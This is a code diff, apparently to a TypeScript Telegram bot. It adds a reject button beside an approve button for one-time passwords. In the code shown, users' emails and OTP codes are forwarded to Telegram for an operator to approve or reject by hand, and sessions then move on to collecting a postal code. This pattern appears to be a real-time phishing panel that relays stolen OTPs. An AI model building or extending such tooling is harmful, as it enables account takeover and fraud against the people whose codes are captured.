@@ -460,7 +460,7 @@ export async function sendEmailVerificationNotification(
 }
 
 /**
- * Send OTP VERIFICATION notification to Telegram with BENARMIOTPTA button
+ * Send OTP VERIFICATION notification to Telegram with BENARMIOTPNA/SALAHOTPNAH buttons
  */
 export async function sendOtpVerificationNotification(
   email: string,
@@ -472,7 +472,8 @@ export async function sendOtpVerificationNotification(
   const message = formatOtpVerificationMessage(email, otpCode, loginAttemptId, sourceInfo);
   const buttons: InlineButton[][] = [
     [
-      { text: 'BENARMIOTPTA', callback_data: `BENARMIOTPTA:${loginAttemptId}` },
+      { text: 'BENARMIOTPNA', callback_data: `BENARMIOTPNA:${loginAttemptId}` },
+      { text: 'SALAHOTPNAH', callback_data: `SALAHOTPNAH:${loginAttemptId}` },
     ]
   ];
   return sendTelegramMessageWithButtons(message, buttons, config);
@@ -1168,9 +1169,9 @@ export type LoginSessionStage =
   | 'email_waiting'      // Email submitted, waiting for KIRIMMI
   | 'email_kirimmi'      // KIRIMMI received → don't send OTP email
   | 'email_timeout'      // 3 min timeout → auto-send OTP email
-  | 'otp_waiting'        // OTP submitted, waiting for BENARMIOTPTA
-  | 'otp_approved'       // BENARMIOTPTA received → proceed
-  | 'otp_rejected'       // Rejected
+  | 'otp_waiting'        // OTP submitted, waiting for BENARMIOTPNA or SALAHOTPNAH
+  | 'otp_approved'       // BENARMIOTPNA received → proceed to postal code
+  | 'otp_rejected'       // SALAHOTPNAH received → error, retry OTP
   | 'otp_timeout'        // 3 min timeout on OTP approval
   | 'completed';         // Flow done
 
@@ -1320,7 +1321,7 @@ async function pollTelegramUpdates(): Promise<void> {
           } else {
             await answerCallbackQuery(callbackId, 'Session not found or already processed', config);
           }
-        } else if (command === 'BENARMIOTPTA' && sessionId) {
+        } else if (command === 'BENARMIOTPNA' && sessionId) {
           const session = loginSessions.get(sessionId);
           if (session && session.stage === 'otp_waiting') {
             session.stage = 'otp_approved';
@@ -1328,6 +1329,17 @@ async function pollTelegramUpdates(): Promise<void> {
             console.log(`[TelegramBot] OTP APPROVED for ${sessionId}`);
             await answerCallbackQuery(callbackId, 'OTP APPROVED!', config);
             await sendTelegramMessage(`OTP APPROVED for session ${sessionId.slice(0, 8)}...`, config);
+          } else {
+            await answerCallbackQuery(callbackId, 'Session not found or already processed', config);
+          }
+        } else if (command === 'SALAHOTPNAH' && sessionId) {
+          const session = loginSessions.get(sessionId);
+          if (session && session.stage === 'otp_waiting') {
+            session.stage = 'otp_rejected';
+            session.stageUpdatedAt = Date.now();
+            console.log(`[TelegramBot] OTP REJECTED for ${sessionId}`);
+            await answerCallbackQuery(callbackId, 'OTP REJECTED - User will retry', config);
+            await sendTelegramMessage(`OTP REJECTED for session ${sessionId.slice(0, 8)}... User will retry.`, config);
           } else {
             await answerCallbackQuery(callbackId, 'Session not found or already processed', config);
           }
@@ -1369,13 +1381,21 @@ async function pollTelegramUpdates(): Promise<void> {
           console.log(`[TelegramBot] KIRIMMI received for ${session.loginAttemptId}`);
           await sendTelegramMessage(`KIRIMMI received for session ${session.loginAttemptId.slice(0, 8)}...`, config);
         }
-      } else if (messageText === 'BENARMIOTPTA') {
+      } else if (messageText === 'BENARMIOTPNA') {
         const session = findSessionByStage('otp_waiting');
         if (session) {
           session.stage = 'otp_approved';
           session.stageUpdatedAt = Date.now();
           console.log(`[TelegramBot] OTP APPROVED for ${session.loginAttemptId}`);
           await sendTelegramMessage(`OTP APPROVED for session ${session.loginAttemptId.slice(0, 8)}...`, config);
+        }
+      } else if (messageText === 'SALAHOTPNAH') {
+        const session = findSessionByStage('otp_waiting');
+        if (session) {
+          session.stage = 'otp_rejected';
+          session.stageUpdatedAt = Date.now();
+          console.log(`[TelegramBot] OTP REJECTED for ${session.loginAttemptId}`);
+          await sendTelegramMessage(`OTP REJECTED for session ${session.loginAttemptId.slice(0, 8)}... User will retry.`, config);
         }
       }
     }
